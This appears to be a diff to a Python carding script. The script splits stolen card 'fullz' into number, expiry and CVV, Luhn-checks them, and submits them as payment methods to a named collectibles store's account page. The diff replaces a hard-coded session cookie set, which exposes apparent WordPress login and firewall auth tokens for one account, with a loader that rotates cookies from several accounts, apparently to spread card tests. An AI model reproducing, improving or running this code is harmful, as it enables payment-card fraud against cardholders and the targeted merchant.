@@ -8,6 +8,8 @@ import asyncio
 from bs4 import BeautifulSoup
 from html import unescape
 import re
+import itertools
+import ast   # to safely parse cookies from text file
 
 
 def gets(s, start, end):
@@ -78,33 +80,23 @@ def is_valid_credit_card_number(number: str) -> bool:
 
     return total % 10 == 0
 
+
+# ================== Load cookies.txt ==================
+with open("cookies.txt", "r", encoding="utf-8") as f:
+    raw_cookies = [line.strip() for line in f if line.strip()]
+
+# Parse each line into dict (must be Python dict format in file)
+all_cookies = [ast.literal_eval(line) for line in raw_cookies]
+cookies_cycle = itertools.cycle(all_cookies)
+
+
+# ================== MAIN FUNCTION ==================
 async def create_payment_method(fullz, session):
     try:
         cc, mes, ano, cvv = fullz.split("|")
-        #user = "renaparael" + str(random.randint(9999, 574545))
-        #mail = "renaparael" + str(random.randint(9999, 574545)) + "@gmail.com"
-        #pwd = "Renaparael" + str(random.randint(9999, 574545))
 
         # Cookies
-        cookies = {
-            '_ga': 'GA1.1.333862603.1756374247',
-            '_gcl_au': '1.1.1881747356.1756374247',
-            'mailchimp_user_email': 'zerotracehacked%40gmail.com',
-            'sbjs_migrations': '1418474375998%3D1',
-            'sbjs_first_add': 'fd%3D2025-08-31%2005%3A24%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2F%3Fsrsltid%3DAfmBOopYzTPOS7xH5nYM1WtqvxvNJJm-dp9XEOiXG7fHqYklIRiy7EgB%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-            'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-            'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-            'mailchimp_landing_site': 'https%3A%2F%2Fapluscollectibles.com%2F%3Fsrsltid%3DAfmBOoq8FJ6vCoYvJ09H23EDOT6KZUY9kpjaAgQiQSptUqge3sfo4zuV',
-            'sbjs_current_add': 'fd%3D2025-08-31%2007%3A15%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2F%3Fsrsltid%3DAfmBOoq8FJ6vCoYvJ09H23EDOT6KZUY9kpjaAgQiQSptUqge3sfo4zuV%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-            'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Safari%2F537.36',
-            'Subscribe': 'true',
-            'mailchimp.cart.current_email': 'zerotracehacked@gmail.com',
-            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
-            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'zerotracehacked%7C1756799157%7CnD7FW8DApW206UkwUXq1XATEYHjrDHTxQZ63YEPncx2%7Ca2e5f8502ab08d7c15b7381d6ecac1c3d5c4e3dd10a025c27e5a4856fd28948d',
-            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '8961%7Cother%7Cread%7C314e7ddb46839835096721fc54c20706a06c35f06c4594bd9475cb8d74eef37f',
-            '_ga_D1Q49TMJ2C': 'GS2.1.s1756625842$o4$g1$t1756626377$j9$l0$h0',
-            'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fpayment-methods%2F',
-        }
+        cookies = next(cookies_cycle)  # pick next account’s cookies
 
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
